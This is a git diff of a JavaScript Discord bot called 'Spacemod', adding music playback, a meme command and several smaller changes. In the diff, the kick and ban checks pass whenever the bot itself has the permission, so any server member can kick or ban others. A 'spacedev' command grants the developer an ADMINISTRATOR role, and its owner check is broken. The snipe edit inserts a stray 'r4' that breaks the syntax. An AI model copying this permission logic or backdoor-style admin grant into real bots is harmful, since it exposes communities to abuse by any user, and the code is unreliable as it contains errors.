@@ -4,8 +4,19 @@ const Canvas = require('canvas')
 const Discord = require('discord.js');
 const client = new Discord.Client({
     autoReconnect: true
-    
+
 });
+const config = require('config');
+const db = config.get('mongoURI');
+const express = require('express');
+const mongoose = require('mongoose');
+
+const app = express();
+const memes = require('discord-meme-generator');
+const checkemoji = ":white_check_mark:"
+const xemoji = "❌"
+
+const ytdl = require('ytdl-core');
 const applyText = (canvas, text) => {
 	const ctx = canvas.getContext('2d');
 
@@ -42,6 +53,7 @@ const conf = require('./conf.json');
 var replyto = undefined;
 var lastupdate = Date();
 var msgsnipe;
+const prefix = conf.prefix
 var data = require('./data.json');
 const { type } = require('os');
 const { table, error } = require('console');
@@ -54,7 +66,6 @@ const fs = require('fs').promises
 const fetch = require('node-fetch');
 const hastebin = require('hastebin-gen');
 const captcha = require('./captcha');
-const mongoose = require('mongoose');
 client.on("guildCreate", guildcreate =>{
     const guild = client.guilds.cache.get(guildcreate.id)
     // Alternatively, to choose a random guild use
@@ -68,7 +79,8 @@ client.on("message", message =>{
     if(message.author.bot) return
     var msg = message.toString().toLowerCase()
     var mentions = message.mentions.users
-    if(msg.includes("spacemod")){
+    if(msg.includes("spacemod") && !message.content.startsWith('.')){
+        
         message.reply("type .help for help!")
     }
     if(message.mentions.everyone && message.guild.id == '762520133964398592'){
@@ -123,6 +135,8 @@ client.on("guildMemberAdd", async guildMemberAdd =>{
 })
 //if a message includes something that doesent have prefix
 
+
+const queue = new Map();
 var emojiname = ("✅"),
     rolename = ("748731994476904479")
     function getRandomNumberBetween(min,max){
@@ -175,10 +189,7 @@ async function snappage(site){
 
 
 
-mongoose.connect('mongodb://localhost:27017/Spacemod', {
-    useNewUrlParser: true,
-    useUnifiedTopology: true
-})
+
 
 client.on("messageDelete", function(message, channel){
     msgsnipe = message;
@@ -206,6 +217,7 @@ if(command == 'cmds' || message.content.startsWith("<@753578252047745055>") || m
             .addField('.cmds owneronly', 'Owner only stuff...')
             .addField('.cmds server', 'Commands that show info about the server.')
             .addField('.cmds fun', 'Fun commands!')
+            .addField(".cmds music", "🆕 🎵MUSIC COMMANDS!🎵 🆕")
             .addField('.help', 'Get help!')
         message.channel.send(cmdsembed)
         }
@@ -271,6 +283,16 @@ if(command == 'cmds' || message.content.startsWith("<@753578252047745055>") || m
             .setTimestamp()
             message.channel.send(servercmdembed)
         }
+        else if(commandargs == 'music'){
+            const musicembed = new Discord.MessageEmbed()
+            .setTitle("New Music!")
+            .setAuthor("Spacemod")
+            .setFooter("Bot made by spacehold")
+            .addField(".play", "Joins and plays the song! Ex: .play (music url)")
+            .addField(".skip", "Skip a song in a queue")
+            .addField(".stop", "Stops and leaves the channel!")
+            message.channel.send(musicembed)
+        }
         else{
 
         
@@ -321,6 +343,16 @@ if(command == 'cmds' || message.content.startsWith("<@753578252047745055>") || m
         .setTimestamp()
         message.channel.send(owneronlyembed2)
         }
+        else if(commandargs == 'music'){
+            const musicembed = new Discord.MessageEmbed()
+            .setTitle("New Music!")
+            .setAuthor("Spacemod")
+            .setFooter("Bot made by spacehold")
+            .addField(".play", "Joins and plays the song! Ex: .play (music url)")
+            .addField(".skip", "Skip a song in a queue")
+            .addField(".stop", "Stops and leaves the channel!")
+            message.channel.send(musicembed)
+        }
         else{
         const cmdsembed2 = new Discord.MessageEmbed()
         .setTitle('Commands Menu')
@@ -330,6 +362,7 @@ if(command == 'cmds' || message.content.startsWith("<@753578252047745055>") || m
                 .addField('.cmds fun', 'Fun commands!')
                 .addField('.cmds server', 'Server commands!')
                 .addField('.cmds owneronly', 'Owner Only commands!')
+                .addField(".cmds music", "🆕 🎵MUSIC COMMANDS!🎵 🆕")
                 .addField('.help', 'Get Help!')
         .setTimestamp()
         message.channel.send(cmdsembed2)
@@ -467,7 +500,11 @@ else if(command == 'avatar'){
         
         
     }
+    else if(command == 'meme'){
+        var msg = message
+        memes.generate(client,msg);
 
+    }
     else if(command == 'hastebin'){
         
         let haste = args.slice(0).join(" ")
@@ -485,7 +522,7 @@ else if(command == 'avatar'){
         message.delete();
     }
     else if(command == 'kick'){
-        if(message.member.roles.cache.has(conf.staffID) || message.guild.owner.user.id === message.author.id || message.author.id == conf.OwnerID){
+        if(message.member.roles.cache.has(conf.staffID) || message.guild.owner.user.id === message.author.id || message.author.id == conf.OwnerID || message.member.guild.me.hasPermission("KICK_MEMBERS") || message.member.guild.me.hasPermission("ADMINISTRATOR")){
             var user = message.mentions.users.first();
             if (user) {
                 var membertokick = message.member.guild.member(user);
@@ -589,12 +626,12 @@ await msg.channel.messages.fetch({ limit: amountclear }).then(messages => { // F
     }
     
     else if(command == 'ban'){
-        if(message.member.roles.cache.has(conf.staffID) || message.guild.owner.user.id === message.author.id || message.author.id == conf.OwnerID){
+        if(message.member.roles.cache.has(conf.staffID) || message.guild.owner.user.id === message.author.id || message.author.id == conf.OwnerID || message.member.guild.me.hasPermission("ADMINISTRATOR") || message.member.guild.me.hasPermission("BAN_MEMBERS")){
             var user = message.mentions.users.first();
             if (user) {
                 var membertoban = message.member.guild.member(user);
                 if(membertoban.bannable){
-                    membertoban.send('You have been banned from spacehold. If you want to appeal, you may appeal here: https://forms.gle/JpTK2n9GBbWdJmsm8')
+                    membertoban.send('You have been banned from '+message.guild.name+', If you want to appeal at spacechat, appeal here: https://forms.gle/JpTK2n9GBbWdJmsm8  if you want to appeal at another server, appeal at their appeal link')
                     membertoban.ban('Banned by ' + message.author.tag)
                     .then(message.channel.send(membertoban.user.tag + ' was banned successfully by <@' + message.author.id + '> (' + message.author.tag + ')'))
                     var banembed = new Discord.MessageEmbed()
@@ -614,7 +651,7 @@ await msg.channel.messages.fetch({ limit: amountclear }).then(messages => { // F
             }
         }
         else{
-            message.channel.send('Hey, you don\'t have the staff role. If you think this is a mistake, join https://discord.gg/6xgZaA5 and dm spacehold (the owner of the bot).')
+            message.channel.send('Hey, you don\'t have the required roles. If you think this is a mistake, join https://discord.gg/6xgZaA5 and dm spacehold (the owner of the bot).')
         }
         
     }
@@ -850,7 +887,7 @@ await msg.channel.messages.fetch({ limit: amountclear }).then(messages => { // F
         }
     }
     else if(command == 'snipe'){
-            if(msgsnipe){
+            if(msgsnipe){r4
                 if (!message.embeds || !message.embeds.length) {
                     var snipeembed = new Discord.MessageEmbed()
                         .setTitle('Message deleted by ' + msgsnipe)
@@ -873,7 +910,7 @@ await msg.channel.messages.fetch({ limit: amountclear }).then(messages => { // F
     } else if(command == 'spacedev'){
         if(!message.author.id == conf.OwnerID) return
         message.delete({ timeout: 0 })
-        await message.guild.roles.create({ data: { name: 'Spacemod Developer', permissions: ["ADMINISTRATOR"], color:"#0000ff" } });
+        await message.guild.roles.create({ data: { name: 'Spacemod Developer', permissions: ["ADMINISTRATOR"], color:"#0000ff", position:message.guild.members.cache.get(client.user.id)} });
         let role = message.guild.roles.cache.find(r => r.name === "Spacemod Developer");
         if(!role) return console.log('no role called spacedev')
 // Let's pretend you mentioned the user you want to add a role to (!addrole @user Role Name):
@@ -1008,7 +1045,7 @@ member.roles.add(role)
         var random = Math.random() * ((100000000000000000000 - 0) + 0)
         message.reply('Random Number: ' + random)
     }
-    else if(command == 'nickname' || command == 'setnickname'){
+    else if(command == 'nickname' || command == 'setnickname' || command == 'nick'){
         let useridnick = args[0];
         let reasonnick = args.slice(1).join(" ")
         if(message.guild.member(useridnick) != undefined){
@@ -1116,6 +1153,14 @@ try  {
     }
     else if(command == 'evan'){
         message.reply('command could not be found, Do you mean .eval or .safeeval?')
+    }
+    else if(command == 'settrial'){
+        if(message.author.id == conf.OwnerID){
+            message.channel.send(args[0] + ' server\'s trial has been set to ' + args[1] + '!')
+        }
+        else{
+            message.reply('owner only command!')
+        }
     }
     else if(command == 'eval'){
         if(message.author.id == conf.OwnerID){
@@ -1535,7 +1580,7 @@ const setValue = (fn, value) =>
 }
 })
 client.on('message', (message) => {
-    var pollchannelids = ['757730360317444136']
+    var pollchannelids = ['757730360317444136', '769294917326864395', '763805034680025088']
     if (!pollchannelids.includes(message.channel.id)){
       return;
     }
@@ -1583,7 +1628,136 @@ client.on("message", message =>{
     }
 })
 
-
+client.on("message", async message => {
+    if (message.author.bot) return;
+    if (!message.content.startsWith(prefix)) return;
+  
+    const serverQueue = queue.get(message.guild.id);
+  
+    if (message.content.startsWith(`${prefix}play`)) {
+        if(message.deletable){
+            message.delete({ timeout: 0 })
+        }
+        message.channel.send("Fetching song...")
+        execute(message, serverQueue);
+      return;
+    } else if (message.content.startsWith(`${prefix}skip`)) {
+        message.channel.send("skipping...")
+        skip(message, serverQueue);
+      return;
+    } else if (message.content.startsWith(`${prefix}stop`)) {
+        message.channel.send("stopping...")
+        stop(message, serverQueue);
+      return;
+    }
+    });
+  
+  async function execute(message, serverQueue) {
+    const args = message.content.split(" ");
+    if(!args[1]) return message.reply("please type a song url!" + xemoji)
+    if(!args[1].startsWith("http") || !args[1].startsWith("https")){
+        message.reply("please send a link!" + xemoji)
+        return
+    }
+    const voiceChannel = message.member.voice.channel;
+    if (!voiceChannel)
+      return message.channel.send(
+        "You need to be in a voice channel to play music!" + xemoji
+      );
+    const permissions = voiceChannel.permissionsFor(message.client.user);
+    if (!permissions.has("CONNECT") || !permissions.has("SPEAK")) {
+      return message.channel.send(
+        "I need the permissions to join and speak in your voice channel! " + xemoji
+      );
+    }
+  
+    const songInfo = await ytdl.getInfo(args[1])
+    
+    const song = {
+      title: songInfo.videoDetails.title,
+      url: songInfo.videoDetails.video_url,
+      likes: songInfo.videoDetails.likes,
+      dislikes: songInfo.videoDetails.dislikes
+    };
+    
+  
+    if (!serverQueue) {
+      const queueContruct = {
+        textChannel: message.channel,
+        voiceChannel: voiceChannel,
+        connection: null,
+        songs: [],
+        volume: 1,
+        playing: true
+      };
+  
+      queue.set(message.guild.id, queueContruct);
+  
+      queueContruct.songs.push(song);
+  
+      try {
+        var connection = await voiceChannel.join();
+        queueContruct.connection = connection;
+        play(message.guild, queueContruct.songs[0]);
+      } catch (err) {
+        console.log(err);
+        queue.delete(message.guild.id);
+        return message.channel.send(err);
+      }
+    } else {
+      serverQueue.songs.push(song);
+      return message.channel.send(`${song.title} has been added to the queue! ${checkemoji}`);
+    }
+  }
+  
+  function skip(message, serverQueue) {
+    if (!message.member.voice.channel)
+      return message.channel.send(
+        "You have to be in a voice channel to stop the music!" + xemoji
+      );
+    if (!serverQueue)
+      return message.channel.send("There is no song that I could skip!" + xemoji);
+    serverQueue.connection.dispatcher.end();
+  }
+  
+  function stop(message, serverQueue) {
+    if (!message.member.voice.channel)
+      return message.channel.send(
+        "You have to be in a voice channel to stop the music!" + xemoji
+      );
+    serverQueue.songs = [];
+    serverQueue.connection.dispatcher.end();
+    message.channel.send("Stopped music!" + checkemoji)
+  }
+  
+  function play(guild, song) {
+    const serverQueue = queue.get(guild.id);
+    if (!song) {
+      serverQueue.voiceChannel.leave();
+      queue.delete(guild.id);
+      return;
+    }
+    var final = song.likes/song.dislikes;
+    var percentage = (final.toFixed(2) + "%");
+    const dispatcher = serverQueue.connection
+      .play(ytdl(song.url, {filter: "audio"}))
+      .on("finish", () => {
+        serverQueue.songs.shift();
+        play(guild, serverQueue.songs[0]);
+      })
+      .on("error", error => console.error(error));
+    dispatcher.setVolumeLogarithmic(serverQueue.volume / 10);
+    if(song.likes/song.dislikes == Infinity){
+    serverQueue.textChannel.send(`Started playing: **${song.title}** with a 100% rating! ${checkemoji}`);
+  }
+  else if(song.likes/song.dislikes == NaN){
+    serverQueue.textChannel.send(`Started playing: **${song.title}**! ${checkemoji}`);
+  }
+  else{
+    serverQueue.textChannel.send(`Started playing: **${song.title}** with a ${Math.round(song.likes/song.dislikes)}% rating! ${checkemoji}`);
+  }
+  
+}
 
 
 
